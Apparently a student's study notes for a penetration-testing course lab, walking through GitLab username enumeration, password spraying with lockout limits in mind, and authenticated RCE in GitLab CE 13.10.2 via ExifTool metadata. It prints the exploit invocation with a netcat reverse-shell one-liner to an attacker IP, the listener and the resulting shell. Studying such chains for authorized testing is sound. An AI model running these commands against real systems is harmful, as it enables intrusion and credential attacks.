This section moves from **GitLab enumeration → user enumeration → controlled credential attacks → authenticated RCE**.

The key progression is:

```text
GitLab
  │
  ├── Username Enumeration
  │        │
  │        ▼
  │   Valid Users
  │        │
  │        ▼
  │   Credential Attack
  │        │
  │        ▼
  │   Valid Credentials
  │        │
  │        ▼
  │   Vulnerable GitLab Version
  │        │
  │        ▼
  │   Authenticated RCE
  │        │
  │        ▼
  │   Shell on GitLab Server
  │        │
  │        ▼
  │   Further Enumeration / Pivot
```

---

# 1. Why Attacking GitLab Matters

Even unauthenticated access to GitLab can potentially expose sensitive information. If we obtain access as a **valid company user or administrator**, the amount of information available can increase substantially.

The module notes that **553 GitLab CVEs** had been reported as of September 2021. Obviously, not every CVE is exploitable, but historically there have been severe vulnerabilities capable of leading to **remote code execution (RCE)**.

The important pentesting mindset is:

> **Don't immediately attack every CVE. First determine what version, authentication level, and functionality you actually have.**

---

# 2. Username Enumeration

## What is it?

Username enumeration means determining which usernames actually exist on the target.

For example, if we submit:

```text
root
admin
bob
john
test
```

and GitLab behaves differently for valid/invalid accounts, we can potentially build:

```text
Valid users:
    root
    bob
```

The module points out that GitLab does **not consider user/project enumeration by itself to be a vulnerability** unless additional impact can be demonstrated.

Nevertheless, it is valuable during a penetration test because valid usernames can be used for subsequent authentication attacks.

---

# 3. Why Valid Usernames Matter

Suppose enumeration gives us:

```text
root
bob
alice
john
```

Now instead of blindly attacking an unknown username list, we have a much smaller and more valuable target set.

Potential next steps in an authorized assessment:

```text
Valid usernames
       │
       ├── OSINT credentials
       │
       ├── Previously discovered passwords
       │
       ├── Credential dumps
       │
       └── Controlled password spraying
```

The module specifically mentions weak/common passwords such as:

```text
Welcome1
Password123
```

and reusing credentials discovered from public breach data.

---

# 4. GitLab User Enumeration Script

The module demonstrates a GitLab user enumeration script.

Example:

```bash
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```

The output identifies valid usernames:

```text
[+] The username root exists!
[+] The username bob exists!
```

The HTTP responses shown include:

```text
LOOP
200

LOOP
302
```

The important result is:

```text
root → exists
bob  → exists
```

The module also explicitly warns that the PoC should **not be run against GitLab.com** and is intended for educational/ethical use.

---

# 5. Password Spraying Considerations ⚠️

This is an important CPTS concept.

Once you have a username list, you might consider controlled password spraying.

But **don't forget account lockout**.

The module states that before GitLab 16.6, the defaults were:

```text
Maximum failed attempts = 10
Unlock period = 10 minutes
```

The relevant configuration shown is:

```ruby
config.maximum_attempts = 10
config.unlock_in = 10.minutes
```

Starting with **GitLab 16.6**, administrators can configure these values through the admin UI.

The settings mentioned are:

```text
max_login_attempts
failed_login_attempts_unlock_period_in_minutes
```

If administrators haven't manually changed them, the defaults remain:

```text
10 failed attempts
10-minute unlock period
```

### CPTS lesson ⭐

Before performing credential attacks:

```text
Enumerate users
      ↓
Understand lockout policy
      ↓
Determine safe attempt rate
      ↓
Use controlled testing
      ↓
Avoid unnecessary account disruption
```

---

# 6. Minimum Password Length ≠ Complete Protection

GitLab administrators can increase the minimum password length.

But:

> **Password length requirements alone don't eliminate password attacks.**

For example, users can still select predictable passwords that satisfy a length requirement.

The module therefore highlights additional controls such as:

- 2FA
    
- Fail2Ban
    
- Network/IP restrictions
    
- Appropriate authentication policies
    

---

# 7. Authenticated Remote Code Execution

Now we reach the major exploitation section.

## What is RCE?

**Remote Code Execution** means an attacker can cause the target server to execute attacker-controlled commands/code remotely.

This is extremely valuable because:

```text
RCE
 │
 ▼
Operating-system access
 │
 ▼
Local enumeration
 │
 ├── Files
 ├── Credentials
 ├── Configuration
 ├── Processes
 └── Network information
 │
 ▼
Potential privilege escalation
 │
 ▼
Potential lateral movement
```

The module describes RCE as particularly valuable because access to the underlying server may expose its data and provide a foothold for attacks against other systems.

---

# 8. GitLab CE 13.10.2 RCE

The specific vulnerability discussed is:

> **GitLab Community Edition 13.10.2 and lower**

The vulnerability involved **ExifTool handling metadata in uploaded image files**.

The module states that the issue could lead to **authenticated remote code execution** and was subsequently fixed by GitLab.

### Important version

```text
GitLab CE <= 13.10.2
        ↓
Potentially vulnerable
```

This is therefore a classic example of why **version enumeration matters**.

---

# 9. Authentication Requirement

This particular attack is **authenticated RCE**.

That means we need:

```text
Valid GitLab username
+
Valid password
```

before exploitation.

There are several possible ways those credentials might be obtained:

```text
OSINT
 │
 ├── Public information
 └── Credential exposure

Credential attacks
 │
 └── Controlled password testing

GitLab self-registration
 │
 └── Create legitimate account
```

The module emphasizes an especially interesting situation:

```text
Vulnerable GitLab
        +
Self-registration enabled
        ↓
Create account
        ↓
Authenticated
        ↓
Attempt vulnerable functionality
```

So you don't necessarily need an administrator account for this particular vulnerability.

---

# 10. Exploitation Example

The module uses:

```bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```

The important arguments are:

```text
-t   Target GitLab URL
-u   Username
-p   Password
-c   Command to execute
```

The exploit reports:

```text
[1] Authenticating
Successfully Authenticated

[2] Creating Payload

[3] Creating Snippet and Uploading
[+] RCE Triggered !!
```

The sequence is therefore:

```text
Authenticate
     ↓
Create payload
     ↓
Create/upload snippet
     ↓
Trigger vulnerable functionality
     ↓
Command execution
```

---

# 11. Reverse Shell

The supplied command establishes a reverse shell back to:

```text
10.10.14.15:8443
```

The listener is:

```bash
nc -lnvp 8443
```

The resulting connection is:

```text
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054
```

Then:

```bash
id
```

returns:

```text
uid=996(git) gid=997(git) groups=997(git)
```

So we have successfully achieved OS-level access as the:

```text
git
```

user.

---

# 12. What Do We Have After RCE?

The shell lands here:

```text
git@app04:~/gitlab-workhorse$
```

Listing the directory:

```bash
ls
```

returns:

```text
VERSION
config.toml
flag_gitlab.txt
sockets
```

This is where the engagement transitions from **web application testing** to **host-level enumeration**.

Your next mindset should be:

```text
RCE achieved
     ↓
Who am I?
     ↓
Where am I?
     ↓
What privileges do I have?
     ↓
What files/configs can I access?
     ↓
What credentials/secrets exist?
     ↓
What network connections exist?
     ↓
Can privileges be escalated?
     ↓
Can this host be used to pivot?
```

---

# 13. Complete GitLab Attack Chain

This is the flow I'd memorize:

```text
                    ┌───────────────────┐
                    │ GitLab discovered │
                    └─────────┬─────────┘
                              │
                              ▼
                   ┌─────────────────────┐
                   │ Enumerate usernames │
                   └──────────┬──────────┘
                              │
                              ▼
                    ┌──────────────────┐
                    │ Valid users found │
                    └────────┬─────────┘
                             │
                             ▼
                  ┌──────────────────────┐
                  │ Obtain credentials   │
                  │ OSINT / reuse / etc. │
                  └──────────┬───────────┘
                             │
                             ▼
                    ┌─────────────────┐
                    │ Authenticate    │
                    └────────┬────────┘
                             │
                             ▼
                  ┌─────────────────────┐
                  │ Determine version   │
                  └──────────┬──────────┘
                             │
                             ▼
                 ┌────────────────────────┐
                 │ Version vulnerable?    │
                 └───────────┬────────────┘
                             │
                             ▼
                  GitLab CE <= 13.10.2
                             │
                             ▼
                    Authenticated RCE
                             │
                             ▼
                       Reverse shell
                             │
                             ▼
                       git user
                             │
                             ▼
                  Host enumeration
                             │
                             ▼
                   Privilege escalation
                   / lateral movement
```

---

# 14. Enumeration → Exploitation Decision Tree

A useful CPTS mental model:

```text
                 GitLab
                    │
          ┌─────────┴─────────┐
          ▼                   ▼
     Unauthenticated      Authenticated
          │                   │
          ▼                   ▼
   /explore             /help → version
          │                   │
          ▼                   ▼
Public repositories      Version check
          │                   │
          ▼                   ▼
Search secrets       Vulnerability research
          │                   │
          ▼                   ▼
Credentials              Vulnerable?
          │                   │
          └─────────┬─────────┘
                    ▼
              Valid credentials
                    │
                    ▼
            Authenticated RCE
                    │
                    ▼
               OS foothold
```

---

# 15. CPTS Exam Points ⭐

### ⭐ Username enumeration

GitLab username enumeration can produce a list of valid accounts.

Example:

```text
root
bob
```

---

### ⭐ Account lockout

Remember:

```text
Default:
10 failed attempts
10-minute unlock
```

GitLab **16.6+** allows administrators to configure the relevant values through the admin UI.

---

### ⭐ Password attacks

Valid usernames can enable:

- Controlled password spraying
    
- Weak password testing
    
- Credential reuse
    

But always consider lockout and service disruption.

---

### ⭐ Authenticated RCE

The module's specific vulnerability:

```text
GitLab CE <= 13.10.2
```

Cause:

```text
ExifTool
+
Uploaded image metadata
```

Impact:

```text
Authenticated RCE
```

---

### ⭐ Self-registration

If:

```text
Self-registration enabled
+
Vulnerable GitLab version
```

you may be able to create your own authenticated account and potentially exploit the vulnerable functionality.

---

### ⭐ RCE ≠ root

The example shell is:

```text
uid=996(git)
```

not root.

So after obtaining RCE:

```text
RCE
 ↓
git user
 ↓
Privilege escalation investigation
```

Don't automatically assume RCE means root/SYSTEM.

---

# 🔥 GitLab Attack Cheat Sheet

```text
IDENTIFY
────────
/users/sign_in

USER ENUMERATION
───────────────
gitlab_userenum.sh
        ↓
root
bob
...

LOCKOUT
───────
10 attempts
10-minute unlock
(before 16.6 defaults)

CREDENTIALS
───────────
OSINT
Credential reuse
Controlled password testing
Self-registration

VERSION
───────
/help

RCE
───
GitLab CE <= 13.10.2
ExifTool image metadata
Authenticated

RESULT
──────
RCE → Reverse Shell → git

VERIFY
──────
id
ls

EXAMPLE RESULT
──────────────
uid=996(git)
gid=997(git)
groups=997(git)
```

---

## 🧠 The Big Picture

The previous module taught:

> **GitLab can leak information.**

This module adds:

> **That information can become an actual attack path.**

The progression is:

```text
Enumeration
     ↓
Valid usernames
     ↓
Credentials
     ↓
Authenticated access
     ↓
Version identification
     ↓
Version-specific vulnerability
     ↓
Authenticated RCE
     ↓
OS-level foothold
     ↓
Privilege escalation / pivoting
```

And that's exactly the kind of chain you should be looking for in a CPTS assessment: **don't treat each vulnerability as an isolated finding—connect the information gathered during enumeration into a realistic attack path.**